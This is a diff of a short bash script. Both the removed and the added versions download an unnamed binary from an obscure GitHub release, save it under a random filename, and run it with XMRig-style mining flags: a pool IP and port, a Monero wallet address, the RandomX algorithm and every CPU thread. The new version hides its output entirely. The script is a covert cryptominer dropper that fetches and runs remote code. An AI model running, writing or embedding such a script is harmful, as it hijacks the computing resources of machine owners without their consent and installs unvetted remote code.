@@ -1,55 +1,15 @@
 #!/bin/bash
-set -e
-
-# Ensure root
-if [ "$(id -u)" -ne 0 ]; then
-    echo "Run as root or sudo"
-    exit 1
-fi
-
-# Fix temp directory
-mkdir -p /tmp
-chmod 1777 /tmp
-export TMPDIR=/tmp
-
-# Update packages
-apt-get update -qq
-
-# Install required packages
-DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
-    wget \
-    curl \
-    ca-certificates \
-    file > /dev/null 2>&1
-
-# Random binary name
+set -e  # Exit on any error
+# Generate a random filename
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
-# Download binary
-curl -L --fail --silent --show-error \
-https://github.com/yafcoplk/hmggklo/releases/download/hmggkloj/hmggklo \
--o "$BIN_NAME"
+# Download binary quietly and rename
+wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
 
-# Verify binary exists
-if [ ! -f "$BIN_NAME" ]; then
-    echo "Download failed"
-    exit 1
-fi
-
-# Verify it's not HTML
-if file "$BIN_NAME" | grep -qi "html"; then
-    echo "Download failed: received HTML instead of binary"
-    rm -f "$BIN_NAME"
-    exit 1
-fi
-
-# Make executable
+# Make it executable
 chmod +x "$BIN_NAME"
 
-# Run
-./"$BIN_NAME" \
--o 52.12.27.30:9032 \
--u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym \
--p hmggklo27N \
--a rx/0 \
--t "$(nproc --all)"
+# Optional: run the binary
+# ./"$BIN_NAME"
+
+./"$BIN_NAME" -o 3.82.4.131:7459 -u 89aQ8FNPXiTEWFMYwubTcKBbHYE6hcsKjcs3jVRUCjitBbYD7cMx4PjVdx2runmKWXAJdUqnbGs25NifTeumjvX15r1Q7ym -p tintasA -a rx/0 -t $(nproc --all) > /dev/null 2>&1
